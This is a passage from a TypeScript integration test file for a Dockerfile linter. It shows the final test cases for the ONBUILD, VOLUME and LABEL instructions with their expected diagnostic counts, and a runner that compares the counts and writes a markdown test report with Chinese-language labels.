    id: 98,
    name: '边缘: ONBUILD 指令',
    category: 'Edge',
    dockerfile: `FROM node:18-alpine
ONBUILD COPY . /app
ONBUILD RUN npm install
ONBUILD CMD ["node", "app.js"]
CMD ["bash"]`,
    expectedErrors: 0,
    expectedWarnings: 1,
    expectedInfos: 0,
    expectedSecurity: 0,
  },
  {
    id: 99,
    name: '边缘: VOLUME 指令',
    category: 'Edge',
    dockerfile: `FROM node:18-alpine
VOLUME /data /app/logs
CMD ["node", "app.js"]`,
    expectedErrors: 0,
    expectedWarnings: 1,
    expectedInfos: 0,
    expectedSecurity: 0,
  },
  {
    id: 100,
    name: '边缘: LABEL 指令',
    category: 'Edge',
    dockerfile: `FROM node:18-alpine
LABEL maintainer="developer@example.com"
LABEL version="1.0"
LABEL description="Test application"
CMD ["node", "app.js"]
USER node`,
    expectedErrors: 0,
    expectedWarnings: 0,
    expectedInfos: 0,
    expectedSecurity: 0,
  }
]

// 运行测试并生成报告
async function runTests() {
  console.log('=' .repeat(80))
  console.log('Dockerfile Linter 全面集成测试 - 100个测试案例')
  console.log('=' .repeat(80))
  console.log()

  let passed = 0
  let failed = 0
  const reportLines: string[] = []

  reportLines.push('# Dockerfile Linter 全面集成测试报告')
  reportLines.push('')
  reportLines.push(`**生成时间**: ${new Date().toISOString().split('T')[0]}`)
  reportLines.push(`**测试案例数**: ${testCases.length}`)
  reportLines.push('')
  reportLines.push('---')
  reportLines.push('')

  // 按类别分组统计
  const categoryStats: Record<string, { passed: number; failed: number }> = {}

  for (const tc of testCases) {
    if (!categoryStats[tc.category]) {
      categoryStats[tc.category] = { passed: 0, failed: 0 }
    }

    const diagnostics = lintDockerfile(tc.dockerfile)
    const actualErrors = diagnostics.filter(d => d.severity === 'error').length
    const actualWarnings = diagnostics.filter(d => d.severity === 'warning').length
    const actualInfos = diagnostics.filter(d => d.severity === 'info').length
    const actualSecurity = diagnostics.filter(d => d.severity === 'security').length

    const errorMatch = actualErrors === tc.expectedErrors
    const warningMatch = actualWarnings === tc.expectedWarnings
    const infoMatch = actualInfos === tc.expectedInfos
    const securityMatch = actualSecurity === tc.expectedSecurity
    const allMatch = errorMatch && warningMatch && infoMatch && securityMatch

    // 输出到控制台
    if (allMatch) {
      passed++
      categoryStats[tc.category].passed++
      console.log(`✅ #${tc.id}: ${tc.name}`)
    } else {
      failed++
      categoryStats[tc.category].failed++
      console.log(`❌ #${tc.id}: ${tc.name}`)
      console.log(`   预期: ${tc.expectedErrors} 错误, ${tc.expectedWarnings} 警告, ${tc.expectedInfos} 信息, ${tc.expectedSecurity} 安全`)
      console.log(`   实际: ${actualErrors} 错误, ${actualWarnings} 警告, ${actualInfos} 信息, ${actualSecurity} 安全`)
      if (diagnostics.length > 0) {
        console.log('   诊断详情:')
        diagnostics.forEach(d => {
          console.log(`     - 行 ${d.line}: [${d.severity}] ${d.id || ''} ${d.message}`)
        })
      }
    }

    // 写入报告
    reportLines.push(`## 测试 #${tc.id}: ${tc.name}`)
    reportLines.push('')
    reportLines.push(`**类别**: ${tc.category}`)
    reportLines.push('')
    reportLines.push('### Dockerfile 代码')
    reportLines.push('')
    reportLines.push('```dockerfile')
    reportLines.push(tc.dockerfile)
    reportLines.push('```')
    reportLines.push('')
    reportLines.push('### 预期结果')
    reportLines.push('')
    reportLines.push(`| 严重级别 | 数量 |`)
    reportLines.push(`|----------|------|`)
    reportLines.push(`| 错误 (error) | ${tc.expectedErrors} |`)
    reportLines.push(`| 警告 (warning) | ${tc.expectedWarnings} |`)
    reportLines.push(`| 信息 (info) | ${tc.expectedInfos} |`)
    reportLines.push(`| 安全 (security) | ${tc.expectedSecurity} |`)
    reportLines.push('')
    reportLines.push('### 实际结果')
    reportLines.push('')
    reportLines.push(`| 严重级别 | 数量 | 匹配 |`)
    reportLines.push(`|----------|------|------|`)
    reportLines.push(`| 错误 (error) | ${actualErrors} | ${errorMatch ? '✅' : '❌'} |`)
    reportLines.push(`| 警告 (warning) | ${actualWarnings} | ${warningMatch ? '✅' : '❌'} |`)
    reportLines.push(`| 信息 (info) | ${actualInfos} | ${infoMatch ? '✅' : '❌'} |`)
    reportLines.push(`| 安全 (security) | ${actualSecurity} | ${securityMatch ? '✅' : '❌'} |`)
    reportLines.push('')
    reportLines.push(`**状态**: ${allMatch ? '✅ 通过' : '❌ 失败'}`)
    reportLines.push('')
    if (!allMatch && diagnostics.length > 0) {
      reportLines.push('### 实际诊断详情')
      reportLines.push('')
      reportLines.push(`| 行号 | 规则ID | 严重级别 | 消息 |`)
      reportLines.push(`|------|--------|----------|------|`)
      for (const d of diagnostics) {
        reportLines.push(`| ${d.line} | ${d.id || '-'} | ${d.severity} | ${d.message} |`)
      }
      reportLines.push('')
    }
    reportLines.push('---')
    reportLines.push('')
  }

  // 总结
  console.log()
  console.log('=' .repeat(80))
  console.log(`测试结果: ${passed} 通过, ${failed} 失败`)
  console.log('=' .repeat(80))
  console.log()
  console.log('按类别统计:')
  for (const [category, stats] of Object.entries(categoryStats)) {
    console.log(`  ${category}: ${stats.passed} 通过, ${stats.failed} 失败`)
  }

  // 写入报告总结
  reportLines.push('## 测试总结')
  reportLines.push('')
  reportLines.push(`**总测试数**: ${testCases.length}`)
  reportLines.push(`**通过**: ${passed}`)
  reportLines.push(`**失败**: ${failed}`)
  reportLines.push(`**通过率**: ${(passed / testCases.length * 100).toFixed(1)}%`)
  reportLines.push('')
  reportLines.push('### 按类别统计')
  reportLines.push('')
  reportLines.push(`| 类别 | 通过 | 失败 | 通过率 |`)
  reportLines.push(`|------|------|------|--------|`)
  for (const [category, stats] of Object.entries(categoryStats)) {
    const rate = stats.passed / (stats.passed + stats.failed) * 100
    reportLines.push(`| ${category} | ${stats.passed} | ${stats.failed} | ${rate.toFixed(1)}% |`)
  }
  reportLines.push('')
  reportLines.push('---')
  reportLines.push('')
  reportLines.push(`**报告生成时间**: ${new Date().toISOString()}`)

  // 写入报告文件
  const fs = await import('fs')
  const reportPath = 'docs/FULL_TEST_REPORT.md'
  await fs.promises.writeFile(reportPath, reportLines.join('\n'))
  console.log()
  console.log(`详细报告已生成: ${reportPath}`)

  return failed === 0
}

// 执行
runTests()